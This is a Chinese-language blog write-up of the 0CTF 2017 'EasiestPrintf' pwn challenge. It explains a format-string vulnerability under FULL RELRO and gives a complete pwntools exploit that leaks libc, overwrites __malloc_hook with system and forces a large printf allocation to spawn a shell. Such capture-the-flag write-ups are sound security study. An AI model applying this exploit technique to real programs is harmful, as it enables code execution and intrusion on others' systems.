---
title: 0CTF 2017 Easiestprintf
date: 2018-04-23 12:21:45
tags: pwn
layout: post
---
0CTF 2017 Easiestprintf
<!--more-->

# 0ctf Pwn Easyprintf
[题目以及exploit][1]

## 0x01 分析
除了PIE没开其他都开了
比较明显的printf格式化字符串漏洞
但是printf后面紧跟着exit（）
如果要hajack exit的got 会因为FULL RELRO而不能写
如果要改返回地址发现前面随机了站地址
then.. 我去看了一下writeup
发现了新姿势
通过[__malloc_hook][2] 或者 [__free_hook][3] 来getshell

## 0x02 利用
思路：
0.利用printf输出长度超过65536来使其调用__malloc_hook
1.在这之前将__malloc_hook的got改写成system
2.在这之前将参数改写为sh的地址sh可以写进bss 因为参数是长度(有细微差距 可以gdb调试 然后改成正确的 __malloc_hook是malloc()的第一个call)
3.检查payload中是否有0x0a

## 0x03 Exploit
```python
from pwn import *
#context.log_level="debug"

def exp():
	p=process("./EasiestPrintf")
	libc=ELF("/lib/i386-linux-gnu/libc.so.6")
	p.readuntil("read:\n")
	p.sendline("134520796")
	data=p.readline()
	data=int(data[:-1],16)
	libc.address=data-libc.symbols['puts']
	sh=libc.search("/bin/sh").next()
	p.readuntil("Bye\n")
	writes = {
		0x0804a100+0x4c:u32("/bin"),
		0x804a104+0x4c:u32("/sh;"),
	        libc.symbols['__malloc_hook']:libc.symbols['system']}
	width = 0x804a100+0x4c-0x20
	sh=libc.search("/bin/sh").next()
	#this sh is toooooo large and printf will not malloc such large chunk#
	gdb.attach(p,'''b * 0x804881c''')
	payload = fmtstr_payload( offset = 7,writes = writes,numbwritten = 0,write_size = 'short') + '%{}c'.format(width)
	p.sendline(payload)
	p.interactive()
	p.close()

exp()
```
## 0x04 总结
1.新姿势 fmtstr中利用 __malloc_hook 和 __free_hook 
2.如果直接用libc中的sh发现需要malloc的chunk过大导致前面某些检查出现问题不会跑malloc
3.如果是2.23的libc,one_gadget并没有用
4.在printf后面直接是exit又是fullrelro所以mallochook是个好选择




[1]: https://github.com/n132/banana/tree/master/Pwn/4-22
[2]: https://blog.betamao.me/2018/03/29/0ctf-2017-easiestprintf-150/#more
[3]: https://poning.me/2017/03/23/EasiestPrintf/